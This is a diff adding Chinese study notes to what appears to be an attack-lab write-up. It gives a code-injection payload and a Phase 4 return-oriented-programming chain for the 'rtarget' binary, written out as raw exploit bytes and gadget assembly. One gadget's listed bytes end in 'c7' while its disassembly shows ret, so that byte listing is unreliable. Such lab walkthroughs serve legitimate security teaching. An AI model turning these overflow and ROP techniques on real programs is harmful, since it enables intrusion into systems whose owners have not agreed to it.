@@ -83,3 +83,32 @@ ie. `0x5561DCB1` = little endian `b1 dc 61 55 00 00 00 00`
 需要输入的字符 (40 bytes random) (ret addr) (string cookie) (code) 
 
 ... (b1 dc 61 55 00 00 00 00) (35 39 62 39 39 37 66 61 00) (68 fa 18 40 00 48 c7 c7 a8 dc 61 55 c3)
+
+
+# RTARGET
+
+## Phase 4
+
+NB. 不要自己编译`farm.c`，因为你的结果可能和`rtarget`中不同；正确做法是在`rtarget`反编译的汇编中找到`start_farm()`到`end_farm()`的代码
+
+可以观察到
+
+`58 90 c3`
+```asm
+4019cc:
+   popq %rax
+   nop
+   ret
+```
+
+`48 89 c7 90 c7`
+```asm
+4019c5:
+   movq %rax, %rdi
+   nop
+   ret
+```
+
+... (gadget 1) (cookie) (gadget 2) (touch2)
+
+... (cc 19 40 00 00 00 00 00) (fa 97 b9 59 00 00 00 00) (c5 19 40 00 00 00 00 00) (ec 17 40 00 00 00 00 00)
